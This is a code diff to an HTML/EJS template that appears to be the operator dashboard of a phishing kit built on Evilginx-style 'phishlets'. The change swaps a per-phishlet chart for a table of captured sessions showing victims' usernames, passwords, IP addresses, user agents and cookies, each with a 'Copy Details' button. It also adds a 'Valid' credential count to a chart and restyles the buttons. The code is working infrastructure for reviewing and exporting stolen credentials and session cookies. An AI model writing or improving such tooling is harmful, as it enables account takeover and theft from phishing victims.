@@ -180,6 +180,17 @@
             align-items: center;
             justify-content: flex-start;
         }
+
+        .btn-purple {
+            color: #fff;
+            background-color: #462b79;
+            border-color: #462b79;
+        }
+
+        .btn-purple:hover {
+            background-color: #28a745;
+            border-color: #28a745;
+        }
     </style>
 </head>
 
@@ -231,7 +242,7 @@
                 <td><%= item.useragent %></td>
                 <td><%= JSON.stringify(new Date(item.create_time).toLocaleString()) %></td>
                 <td>
-                    <button class="btn btn-success btn-sm" onclick="copyDetails(this)">
+                    <button class="btn btn-purple btn-sm" onclick="copyDetails(this)">
                         Copy Details
                         <span style="display: none"><%= JSON.stringify(item.custom) %></span>
                     </button>
@@ -268,20 +279,39 @@
                 </div>
             </div>
 
-            <div class="col-md-12">
-                <div class="card">
-                    <div class="card-header">
-                        <h5>Pishlet Wise State</h5>
-                    </div>
-                    <div class="card-body">
-                        <div id="countryWiseIpCount" style=" width: 100%;
-  height: 600px"></div>
-                    </div>
-                </div>
+            <div class="table table-responsive1">
+                <table id="sessionTable">
+                    <tr>
+                        <th>Session</th>
+                        <th>Username</th>
+                        <th>Password</th>
+                        <th>User IP</th>
+                        <th>User Agent</th>
+                        <th>Time</th>
+                        <th>Cookies</th>
+                    </tr>
+                    <% data.sort((a, b) => b.id - a.id).forEach(item => { %> <!-- Sort sessions by descending ID -->
+                    <% if (item.username || item.password || item.cookies) { %>
+                        <!-- Only show if any of these are not empty -->
+                        <tr>
+                            <td style="word-break: break-all; font-size: 90%; padding: 20px 10px;"><%= item.id %></td>
+                            <td><%= item.username || 'N/A' %></td> <!-- Display 'N/A' if empty -->
+                            <td><%= item.password || 'N/A' %></td> <!-- Display 'N/A' if empty -->
+                            <td><%= item.remote_addr %></td>
+                            <td><%= item.useragent %></td>
+                            <td><%= JSON.stringify(new Date(item.create_time).toLocaleString()) %></td>
+                            <td>
+                                <button class="btn btn-purple btn-sm" onclick="copyDetails(this)">
+                                    Copy Details
+                                    <span style="display: none"><%= JSON.stringify(item.custom) %></span>
+                                </button>
+                            </td>
+                        </tr>
+                    <% } %>
+                    <% }) %>
+                </table>
             </div>
-
         </div>
-
     </div>
 </div>
 
@@ -387,11 +417,11 @@
     new Chart(userPassPieChart, {
         type: 'doughnut',
         data: {
-            labels: ['Valid UserName', 'Valid Password', 'Both Invalid'],
+            labels: ['Valid', 'Valid User Name', 'Valid Password', 'Both Invalid'],
             datasets: [{
                 label: 'Total',
-                data: [<%= validUserCount %>, <%= validPasswordCount %>, <%= invalidUserPassCount %>],
-                backgroundColor: ['#4CAF50', '#cfcf12', 'red'],
+                data: [<%= validUser %>,<%= validUserCount %>, <%= validPasswordCount %>, <%= invalidUserPassCount %>],
+                backgroundColor: ['#4CAF50', '#0E8686FF', '#442f7d', 'red'],
                 hoverOffset: 4
             }]
         },
